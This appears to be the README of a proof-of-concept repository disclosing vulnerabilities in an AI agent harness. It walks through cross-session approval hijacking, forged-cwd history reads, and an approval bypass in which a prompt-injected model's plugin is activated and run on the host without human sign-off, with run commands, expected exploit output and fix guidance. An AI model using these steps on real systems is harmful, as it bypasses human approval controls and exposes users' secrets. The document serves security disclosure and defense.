# dsh-security-pocs

Proof-of-concept exploits for three security findings in **DeepSeek Harness** ([deepseek-harness](https://github.com/deepseek-harness/deepseek-harness), version 0.1.0-rc.5, pre-release, commit `47f943859b`), independently discovered and verified against the real product.

Every PoC drives the real `dsh web` server — the vendored Loader, the API proxy, the `session_query` tool seam, and the `cordis-host-runner` / Typert gateway — from a clean attacker position: a separate local process with **no session credentials, no tokens, no UI**. The only scripted component is the model turn: the repo's own `llm-mock-server` deterministically emits the tool call the model is steered into by prompt injection, so every reproduction is deterministic and needs **no API key**.

Full writeup: [WRITEUP.md](WRITEUP.md).

> **Disclaimer.** For authorized security research and defensive purposes only. Run these only against systems you own.

## Findings

| # | PoC | Vulnerability | Verified result |
|---|---|---|---|
| V1 | `poc-v1-cross-session-approval-hijack.sh` | Cross-session approval / question hijack (CWE-862 / CWE-306). `events.mux` globally broadcasts every session's pending approvals and questions; `POST /api/respond` correlates only by wire fields, never by session ownership. A local attacker process answers **another session's** approval — `danger-full-access` bash and `ask_user_question` both resolved without a human. | bash executed under `danger-full-access` / victim question answered |
| V2 | `poc-v2-forged-cwd-cross-session-read.sh` | Forged-cwd cross-session read (CWE-639). `session.create` accepts any caller-asserted `cwd` (and auto-`mkdir -p`'s it); the `session_search` tool authorizes cross-session reads by `cwd` **string equality**. A session created with the victim's workspace path reads the victim's full history — including a secret API key — through the model tool layer. Opt-in: requires the documented content-search deployment. | victim's fake API key leaked into attacker session |
| V3 | `poc-v3-typert-runhosthalf-bypass.sh` | `runHostHalf` approval bypass (CWE-306 / CWE-862). The Typert Remote method activates a model-defined plugin via its `requestId: null` branch — designed as "human clicked run in the UI" — with no approval and no holder check; `invoke` then executes the plugin's host handler with full runtime permissions. | plugin activated and host handler executed, zero approval |
| V3b | `poc-v3b-typert-unauthenticated-surface.sh` | Unauthenticated Typert Remote surface (CWE-306). `pluginInventory/list`, `dynamicCordisRunner/inventory` and `host.listDirectory` are mounted by the **default** web profile and callable with no authentication — any trusted-host process (or LAN peer when bound to `0.0.0.0`) can enumerate the plugin tree and list directories. | 133-entry inventory / dynamic registry / 48-entry directory listing |

The end-to-end chain (V3):

```
victim session: model (steered by prompt injection) defines a plugin via cordis_define
        │   defined — never run, never approved
        ▼
attacker: POST /api dynamicCordisRunner/runHostHalf {"requestId":null}
        │   cordis-host-runner/src/index.ts:324-377 — no approval, no holder check
        ▼
plugin activated (run-1) without human approval
        │
        ▼
attacker: POST /api dynamicCordisRunner/invoke {"method":"pwn"}
        │   executes the plugin's host handler with host-runtime permissions
        ▼
{"pwned":true} — arbitrary host code, no session credential anywhere
```

## Requirements

- macOS or Linux
- Node ^22.19 || >=24, pnpm, ripgrep (`rg`), `curl`, `lsof`
- A source checkout of deepseek-harness with `pnpm install` completed, placed as a **sibling directory** named `deepseek-harness` (or pointed to via `REPO`)

```sh
git clone https://github.com/deepseek-harness/deepseek-harness.git
cd deepseek-harness && pnpm install
```

Ports `3080` (web) and `8000` (mock LLM) must be free. No API key is required — the model turn is scripted by `packages/test-support/llm-mock-server`.

## Run

From the harness checkout:

```sh
cd deepseek-harness
bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh
VARIANT=question bash ../dsh-security-pocs/poc-v1-cross-session-approval-hijack.sh
bash ../dsh-security-pocs/poc-v2-forged-cwd-cross-session-read.sh
bash ../dsh-security-pocs/poc-v3-typert-runhosthalf-bypass.sh
bash ../dsh-security-pocs/poc-v3b-typert-unauthenticated-surface.sh
```

If the checkout lives elsewhere:

```sh
REPO=/path/to/deepseek-harness bash /path/to/dsh-security-pocs/poc-v3-typert-runhosthalf-bypass.sh
```

Each script starts and stops its own `dsh web` and mock-LLM processes, prints the captured evidence, and exits `0` only when the exploit is confirmed. Captured frames land in `evidence/` (runtime artifacts are gitignored); the mux-capture helper `capture-mux.mjs` lives at the repo root.

## Expected output

`poc-v1-cross-session-approval-hijack.sh` (bash variant):

```
attacker captured: {"type":"server-request",...,"method":"approval/requested","payload":{"type":"approval/requested","sessionId":"session-<victim>","approvalId":"...","toolName":"bash","reason":"escalate sandbox to danger-full-access: ..."}}
attacker /api/respond -> {"accepted":true}
VERIFIED: bash command executed under danger-full-access; probe: MOCKPROBE
```

Question variant ends with:

```
attacker /api/respond -> {"accepted":true}
VERIFIED: attacker answered the victim ask_user_question; respond={"accepted":true}
```

`poc-v2-forged-cwd-cross-session-read.sh`:

```
CROSS-SESSION READ CONFIRMED — attacker session A read victim session B:
{"seq":49,...,"text":"Session search results (1): ... Snippet: Deployment note: database password is hunter2 and the production API key is sk-victim-...-deadbeef (VICTIM_SECRET_...). Do not commit it."}
✔ fake API key sk-victim-...-deadbeef leaked to attacker session A
```

`poc-v3-typert-runhosthalf-bypass.sh`:

```
✔ runHostHalf 接受: 插件已激活(人工审批被绕过)
{"type":"server-response",...,"result":{"ok":true,"value":{"ok":true,"pluginId":"pwn-1","packageId":"pkg-1","pluginRunId":"run-1","waitingFor":[],"startedHere":true}}}
...
PWNED — 攻击者未经人工审批激活插件并执行其 host handler
```

`poc-v3b-typert-unauthenticated-surface.sh`:

```
✔ entries=133
✔ endpoint reachable, result.ok=true
✔ browse 能力下 host.listDirectory 无鉴权返回目录列表: entries: 48 | first: {"name":".agents","path":"/Users/<name>/.agents","hidden":true}
```

## Fix guidance

- **V1** — scope `events.mux` per session; bind `/api/respond` to session ownership via a one-time token issued only to the human UI; minimal fix: require the responder to be the same session and a UI source.
- **V2** — `session_query` authorization must not key off the caller-asserted `header.cwd` string; bind cross-session reads to a workspace registry / session ownership or add user approval; constrain `session.create` `cwd` to registered workspaces (also removes the arbitrary `mkdir -p` side effect).
- **V3 / V3b** — bind Remote methods (`inventory`, `invoke`, `resolveRequestRun`, `runHostHalf`) to session ownership; `runHostHalf`'s `requestId: null` branch must require the human-UI one-time token; stop broadcasting `cordis/request-run` on the global mux; restrict `host.listDirectory` to registered workspaces; do not auto-trust all LAN IPs.

Once the fixes land, these scripts convert directly into regression tests.

## Timeline

- 2026-08-15 — deterministic real-instance verification complete (rc.5 @ `47f943859b`); PoCs and writeup published.
